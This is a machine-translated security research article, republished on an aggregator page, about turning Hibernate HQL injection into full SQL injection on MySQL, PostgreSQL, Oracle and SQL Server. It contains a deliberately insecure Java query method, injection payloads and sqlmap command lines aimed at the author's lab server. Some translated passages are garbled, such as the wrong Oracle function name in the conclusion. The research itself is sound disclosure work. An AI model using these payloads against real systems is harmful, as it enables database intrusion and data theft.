<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exploitation of injections in Hibernate ORM</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A report on this topic was presented at the ZeroNights 0x05 conference on the FastTrack section. The work turned out to be very relevant and aroused g...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exploitation of injections in Hibernate ORM</h1><div class="post__text post__text-html js-mediator-article"><img width="300" height="329" src="https://habrastorage.org/files/7e8/7d8/ffa/7e87d8ffa10e4e88a32b6b5cf58e41f2.png" alt="image" align="left"><br>  A report on this topic was presented at the <a href="http://2015.zeronights.ru/">ZeroNights 0x05</a> conference on the FastTrack section.  The work turned out to be very relevant and aroused great interest, since lately the problem of operating HQL injections has <a href="https://twitter.com/Agarri_FR/status/670176931627851776">interested many security researchers specializing in web security</a> .  Therefore, I decided to write an article that reveals additional details to better understand the results of the work. <br><br>  Modern applications written in the Java language, as a rule, work with the DBMS not directly, but use the Java Persistence API (JPA).  JPA is an API that has been added to the Java SE and Java EE platforms since Java version 5, so that it is convenient to save Java objects to the database and retrieve them from the database.  There are a large number of ORM libraries (ORM - Object-Relational Mapping) for JAVA, which implement the JPA specification.  To date, the latest version of the specification 2.1. <br><br>  One of the popular ORM libraries is <a href="http://hibernate.org/">Hibernate ORM</a> .  Hibernate is currently a RedHat project.  WildFly and JBoss application servers use Hibernate as the ORM. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Hibernate ORM uses the object-oriented query language <a href="https://docs.jboss.org/hibernate/orm/3.3/reference/en/html/queryhql.html">Hibernate Query Language (HQL)</a> to write queries to Hibernate entities that are stored in the database. <br><a name="habracut"></a><br><h3>  HQL injection </h3><br>  To transfer parameters to the HQL query, named parameters or positional parameters are used.  Below is an example of passing a parameter to an HQL query using named parameters.  The <code>name</code> parameter is passed to the HQL query. <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> List&lt;Post&gt; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getByName_Secure</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String name)</span></span></span><span class="hljs-function"> </span></span>{ Query query = em.createQuery(<span class="hljs-string"><span class="hljs-string">"SELECT p FROM Post p where p.name=:name"</span></span>, Post.class); query.setParameter(<span class="hljs-string"><span class="hljs-string">"name"</span></span>, name); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (List&lt;Post&gt;) query.getResultList(); }</code> </pre><br>  A developer, through ignorance or misunderstanding, may try to pass the name parameter directly to the HQL query using concatenation, instead of using parameter binding, as shown above.  In this case, the code contains a HQL injection (HQLi).  Below is an example of unsafe code. <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> List&lt;Post&gt; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getByName_Insecure</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String name)</span></span></span><span class="hljs-function"> </span></span>{ Query query = em.createQuery(<span class="hljs-string"><span class="hljs-string">"SELECT p FROM Post p where p.name='"</span></span> + name + <span class="hljs-string"><span class="hljs-string">"'"</span></span>, Post.class); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (List&lt;Post&gt;) query.getResultList(); }</code> </pre><br>  When using HQLi, an attacker will not be able to read the contents of tables that are different from the post table to which the Post class is mapped.  When accessing a table in a subquery that is not related to an entity, a <code>HibernateQueryException</code> exception is generated and the query is not further processed. <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> hqli.persistent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> javax.persistence.*; <span class="hljs-meta"><span class="hljs-meta">@Entity</span></span> <span class="hljs-meta"><span class="hljs-meta">@Table</span></span>(name = <span class="hljs-string"><span class="hljs-string">"post"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Post</span></span></span><span class="hljs-class"> </span></span>{ ‚Ä¶ }</code> </pre><br>  This is a serious obstacle in the operation of HQLi, if, of course, the entity-class is not associated with a table that stores the data used by the application for authentication or authorization. <br><br>  Researcher <a href="https://twitter.com/paulwebsec">@PaulWebSec</a> wrote the <a href="https://twitter.com/paulwebsec">HQLmap</a> utility for exploiting HQLi.  The utility implements blind and error-based techniques for operating HQLi, but allows you to retrieve data only from related tables. <br><br>  Another researcher <a href="https://twitter.com/h3xstream">@ h3xstream</a> wrote <a href="http://blog.h3xstream.com/2014/02/hql-for-pentesters.html">an article</a> about HQLi technology.  This article describes the basic techniques of operation, which also do not allow access to the database tables that are not related to the entity. <br><br><h3>  Purpose of the study </h3><br>  The main goal is to get access to all database tables that are available to the current database user.  Those.  find the ability to exploit HQLi as a SQL injection (SQLi). <br><br>  The main task of the Hibernate ORM is to convert the HQL query into a SQL query.  HQL to SQL conversion takes place in three steps: <br><ol><li>  Parsing an HQL query using <a href="http://www.antlr.org/">ANTLR</a> using the following <a href="">grammar</a> .  The result of the parsing is HQL-AST ( <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">AST - Abstract syntax tree</a> ). </li><li>  Convert HQL-AST to SQL-AST.  Just at this stage it is checked that the HQL query refers only to related tables. </li><li>  Converting SQL-AST to SQL-query, which will be sent to the DBMS. </li></ol><br>  We can reformulate the goal as follows: we need to find an HQL subquery that will allow the entire HQL query to go through the conversion stages 1 and 2, and, most importantly, allow us to access the table that is not related to the entity in step 3.  I would like to find HQL-subqueries with the specified property for popular relational DBMS: MySQL, Postgresql, Oracle and Microsoft SQL Server. <br><br><h3>  Research methods </h3><br>  The first thing was written the vulnerable application that was used for the experiments, it is available <a href="https://github.com/0ang3el/HQLi-playground">here</a> .  The application accepts a URL parameter that is passed as an argument to the vulnerable <code>getByName_Insecure</code> function. <br><br>  This application has been deployed to the WildFly application server.  For the application server, JDBC drivers were installed for the following DBMS: MySQL, Postgresql, Oracle and Microsoft SQL Server.  Using the Datasource property set named HQLiDS, the application was connected to different DBMS. <br><br>  The Hibernate logging level was set to Debug so that HQL and its corresponding SQL queries are written to the application server logs. <br><br>  HQL grammar features and HQL-AST to SQL-AST conversion features were studied.  These features allowed for each of the DBMS to find the operation technique. <br><br><h3>  HQLi operation in MySQL </h3><br>  The technique of operation is based on the fact that in Hibernate and MySQL differently occurs exaping quotes in strings.  In order to use a quote in a string in Hibernate, you need to double it.  In order to use a quote in a string in MySQL, you need to escape it with a slash. <br><br><pre> <code class="diff hljs"># Hibernate 'String with '' symbol' # MySQL 'String with \' symbol'</code> </pre><br>  What happens if we pass <code>\''</code> in the string (a slash and then two quotes)?  Those.  if, as the name parameter, we pass the following value to the vulnerable <code>getByName_Insecure</code> method. <br><br><pre> <code class="diff hljs">dummy\'' or 1&lt;length((select version())) --</code> </pre><br>  Hibernate will see the string because  slash is a normal character for Hibernate and a double quote is a screened quote.  Thus, the resulting HQL query will go through the conversion stages 1 and 2. On the contrary, MySQL will see a screened quote <code>\'</code> and an unscreened quote that terminates the string and the rest of the value of the parameter or <code>1&lt;length((select version())) --</code> will be accepted DBMS as a SQL expression. <br><br>  In this case, the HQL injection can be exploited using the <a href="http://sqlmap.org/">sqlmap</a> utility as follows. <br><br><pre> <code class="diff hljs">sqlmap -u "http://192.168.66.10:8080/app/dummy%5C%27%27%20or%201%3Clength%28%28select%20version%28%29%20from%20dual%20where%201=1*%29%29%20--%20" --dbms="MySQL" --technique B -b -v 0</code> </pre><br>  This technique was shown at the <a href="http://www.synacktiv.fr/en/">SYNACTIV</a> conference <a href="http://www.synacktiv.fr/en/">by a</a> researcher <a href="https://twitter.com/_unread_">@_unread_</a> before our performance at ZeroNights.  Here is the link to the <a href="http://www.synacktiv.fr/ressources/hql2sql_sstic_2015_en.pdf">presentation</a> . <br><br><h3>  HQLi operation in Postgresql </h3><br>  For Postgresql, the quotes trick doesn't work, because  Postgresql escapes quotes in the same way as Hibernate. <br><br>  Hibernate allows you to call any DBMS functions and transfer arbitrary identifiers as parameters to these functions.  Postgresql has a useful function <code>query_to_xml('select 1',‚Ä¶)</code> , which allows you to execute an arbitrary SQL query, which is passed to it as the first parameter.  The function returns an XML object.  In order to use <code>query_to_xml</code> for exploitation, it is necessary to wrap it additionally in calls to the <code>array_upper</code> and <code>xpath</code> functions.  If the SQL query <code>query_to_xml</code> in <code>query_to_xml</code> returns one or more rows, then this construct will return the value <code>1</code> . <br><br><pre> <code class="html hljs xml">array_upper(xpath('row',query_to_xml('SQL', true, false,'')),1)</code> </pre><br>  The query <code>select 1 where 1337&gt;1</code> returns a single string, so the expression returns the value <code>1</code> . <br><br><pre> <code class="diff hljs">postgres=# select array_upper(xpath('row',query_to_xml('select 1 where 1337&gt;1', true, false,'')),1); array_upper ------------- 1 (1 row)</code> </pre><br>  The <code>select 1 where 1337&lt;1</code> query returns zero rows, so the expression <b>does not</b> return the value <code>1</code> . <br><br><pre> <code class="diff hljs">postgres=# select array_upper(xpath('row',query_to_xml('select 1 where 1337&lt;1', true, false,'')),1); array_upper ------------- (1 row)</code> </pre><br>  Ultimately, we can exploit HQLi using sqlmap as follows. <br><br><pre> <code class="diff hljs">sqlmap -u "http://hqli.playground.local:8080/hqli.playground/dummy%27%20and%20array_upper%28xpath%28%27row%27%2Cquery_to_xml%28%27select%201%20where%201337%3E1*%27%2Ctrue%2Cfalse%2C%27%27%29%29%2C1%29%3D1%20and%20%271%27%3D%271" --dbms="PostgreSQL" --technique B -b -v 0</code> </pre><br>  A video that shows the operation of HQLi for Postgresql DBMS is available <a href="https://www.youtube.com/watch%3Fv%3D6WeUxAmYgHQ">here</a> . <br><br><h3>  Operating HQLi in Oracle </h3><br>  For Oracle, HQLi operation is similar to its operation in Postgresql.  In Oracle, the <code>DBMS_XMLGEN.getxml('SQL')</code> function allows you to execute any SQL query and returns a <code>CLOB</code> .  In order to use the <code>DBMS_XMLGEN.getxml</code> function for operation, it is necessary to wrap it with calls to the functions <code>NVL</code> and <code>TO_CHAR</code> .  If the SQL query passed to <code>DBMS_XMLGEN.getxml</code> returns zero rows, the following construct returns the value <code>'1'</code> . <br><br><pre> <code class="diff hljs">NVL(TO_CHAR(DBMS_XMLGEN.getxml('SQL')),'1')</code> </pre><br>  Using the sqlmap exploitation of HQLi in the Oracle DBMS is as follows. <br><br><pre> <code class="diff hljs">sqlmap -u "http://hqli.playground.local:8080/hqli.playground/dummy%27%20and%20NVL(TO_CHAR(DBMS_XMLGEN.getxml(%27select%201%20from%20dual%20where%201337&gt;1*%27)),%271%27)!= %271%27%20and%20%271%27=%271" --dbms="Oracle" --technique B -b -v 0</code> </pre><br><h3>  Operation HQLi in Microsoft SQL Server </h3><br>  For Microsoft SQL Server DBMS, the quotes trick does not work.  Functions like <code>query_to_xml</code> and <code>query_to_xml</code> missing in the DBMS. <br><br>  In this case, HQLi exploitation is based on the fact that Hibernate allows the use of Unicode characters in function names and parameter names that are passed to the function.  At the same time, SQL Server DBMS allows the use of Unicode characters like <code>No-break spac (U+00A0)</code> or <code>Ideographic space (U+3000)</code> as spaces.  Thus, the following two queries are valid and equivalent in SQL Server. <br><br><pre> <code class="diff hljs">select top1 uname from postusers select[U+00A0]top[U+00A0]1[U+00A0]uname[U+00A0]from[U+00A0]postusers</code> </pre><br>  Thus, if we pass the following value as a parameter to the vulnerable method. <br><br><pre> <code class="diff hljs">dummy' or 1&lt;LEN([U+00A0](select[U+00A0]top[U+00A0]1[U+00A0]uname[U+00A0]from[U+00A0]postusers)) or '1'='1</code> </pre><br>  Hibernate sees the call to the function <code>Len</code> , inside which the function with the name <code>[U+00A0]</code> and to which the next parameter is passed as an argument. <br><br><pre> <code class="diff hljs">select[U+00A0]top[U+00A0]1[U+00A0]uname[U+00A0]from[U+00A0]postusers</code> </pre><br>  From the point of view of Hibernate, everything seems normal, since Hibernate allows you to call any functions and pass any variables to them as parameters.  HQL query successfully passes the stages of conversion 1 and 2. <br><br>  SQL Server will see an additional subquery that accesses the <code>postusers</code> table, since <code>[U+00A0]</code> perceived as a space. <br><br><pre> <code class="diff hljs">dummy' or 1&lt;len((select top 1 uname from postusers)) or '1'='1</code> </pre><br>  Exploiting HQLi using sqlmap directly will not work.  In this regard, a Perl script was written that can extract table names in the current database, extract column names for the selected table, and finally dump the selected table.  A video that demonstrates how the Perl script works is available <a href="https://www.youtube.com/watch%3Fv%3Dm_MTWZptXUw">here</a> .  Perl script is available <a href="https://github.com/0ang3el/Hibernate-Injection-Study/blob/master/hqli_sql_server_demo.pl">here</a> . <br><br><h3>  Conclusion </h3><br>  New techniques were found that allow HQLi to be exploited as blind SQLi for popular DBMSs.  This equates the danger of any HQLi to the danger of SQLi. <br><br>  Exploitation techniques work because of the peculiarities of HQL query parsing and the peculiarities of converting HQL-AST to SQL-AST: <br><ol><li>  Escaping quotes in a string is done by doubling them.  In MySQL DBMS, quotation escaping is done differently (using the slash symbol). </li><li>  It is possible to use any names for the called functions.  In HQL, you can call the <code>query_to_xml</code> function for Postgresql and the <code>query_to_xml</code> function for Oracle. </li><li>  It is possible to use Unicode characters in the names of called functions and the names of parameters passed to them.  You can use the symbols <code>No-break spac (U+00A0)</code> or <code>Ideographic space (U+3000)</code> , which are interpreted as a space in Microsoft SQL Server. </li></ol><br>  Presentation from performance on ZeroNights 0x05. <br><div class="slideshow"><iframe src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.slideshare.net/slideshow/embed_code/55555661&amp;xid=17259,15700021,15700186,15700190,15700248,15700253&amp;usg=ALkJrhjw5Sn1OCEWiVwcN30XPBu1YUmOPQ" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div></div><p>Source: <a href="https://habr.com/ru/post/272589/">https://habr.com/ru/post/272589/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../272573/index.html">Underground carders market. Translation of the book "KingPIN". Chapter 21. "Master Splyntr"</a></li>
<li><a href="../272575/index.html">Minimum font size and default encoding in Vivaldi 1.0.344.5</a></li>
<li><a href="../272577/index.html">How to copy Skype and Google Chrome and Mozilla Firefox settings profiles from one / home to another</a></li>
<li><a href="../272579/index.html">Free course ‚ÄúAndroid. Fast start"</a></li>
<li><a href="../272581/index.html">Zsh life tricks</a></li>
<li><a href="../272591/index.html">Microsoft added the ability to disable tracking in versions of Windows 10 for corporate clients</a></li>
<li><a href="../272593/index.html">How institution botanists automate</a></li>
<li><a href="../272597/index.html">How to make friends 1C and Office 365</a></li>
<li><a href="../272601/index.html">Google fixed Android vulnerabilities</a></li>
<li><a href="../272605/index.html">Product Design Digest November 2015</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>